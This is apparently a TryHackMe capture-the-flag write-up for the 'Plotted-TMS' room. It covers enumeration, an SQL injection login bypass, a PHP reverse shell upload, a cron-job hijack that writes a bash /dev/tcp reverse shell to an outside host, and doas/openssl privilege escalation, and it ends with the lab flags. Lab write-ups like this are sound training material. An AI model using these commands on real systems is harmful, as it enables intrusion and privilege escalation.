# Room: Plotted-TMS

## General Info
- **Room link:** [Plotted-TMS](https://tryhackme.com/room/plottedtms)


## Description

Happy Hunting!

Tip: Enumeration is key!

## Provided Files / Links
- [x] Target Machine IP (10.10.143.243)

## Enumeration / Recon

- Port Enumeration:
`nmap -sV 10.10.143.243`

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

- Directory Enumeration

I first enumerate on the port 80:

`gobuster dir -u http://10.10.143.243 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/admin                (Status: 301) [Size: 314] [--> http://10.10.143.243/admin/]
/shadow               (Status: 200) [Size: 25]
/passwd               (Status: 200) [Size: 25]
/server-status        (Status: 403) [Size: 278]
```

In the /admin page, there is an id_rsa file with the following base64 string `VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE`. The decoding string is `Trust me it is not this easy..now get back to enumeration :D`.

In the /shadow and /passwd pages, the following base64 strings `bm90IHRoaXMgZWFzeSA6RA==` => `not this easy :D`.

Then I enumerate on the port 445:

`gobuster dir -u http://10.10.143.243:445 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/management           (Status: 301) [Size: 324] [--> http://10.10.143.243:445/management/]
/server-status        (Status: 403) [Size: 279]
```

I went to /management, there is Login button which leads to /management/login.php.

I test for basic SQLi with `' OR 1=1 -- ` and I actually log in the application as Admin.

## Website exploitation

In the http://10.10.143.243:445/management/admin/?page=user/list page, I find a user `puser`.

When going to the settings page (http://10.10.143.243:445/management/admin/?page=system_info), I found that there are several uploads fields (for logo and cover).

I uploaded a php reverse shell and got straight in the target machine (with `nc -nlvp 1337`).

I stabilized the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

I find the first user flag in /home/plot_admin/user.txt but I don't have permission to read it (I am user www-data).

When inspecting /etc/group, I notice that user ubuntu is in the sudo group (it will be the way to get root access).

I downloaded linpeas.sh from my machine and ran it.

The most import line is:

`* *     * * *   plot_admin /var/www/scripts/backup.sh`

Since I am www-data, I have access to this file in the /www directory.

I delete it to create a new reverse shell:

```
echo '#!/bin/bash' > backup.sh
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.9.1.194/33456 0>&1"' >> /var/www/scripts/backup.sh.
```

I was waiting for a couple of minutes and forgot to give execute permission to the script: `chmod +x backup.sh`.

### Plot_admin

After a minute, I am plot_admin. I can now read the user.txt flag `77927510d5edacea1f9e86602f1fbadb`.

I then ran linpeas.sh on this user and found this vulnerability:

```
╔══════════╣ Checking doas.conf
permit nopass plot_admin as root cmd openssl 
```

With this finding, I had a look at the "file read" section of https://gtfobins.github.io/gtfobins/openssl/:

```
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

LFILE=file_to_read
openssl enc -in "$LFILE"
```

I then followed this privilege escalation method:

```
LFILE=/root/root.txt 
doas -u root openssl enc -in "$LFILE" 
```

And got the root flag **53f85e2da3e874426fa059040a9bdcab**.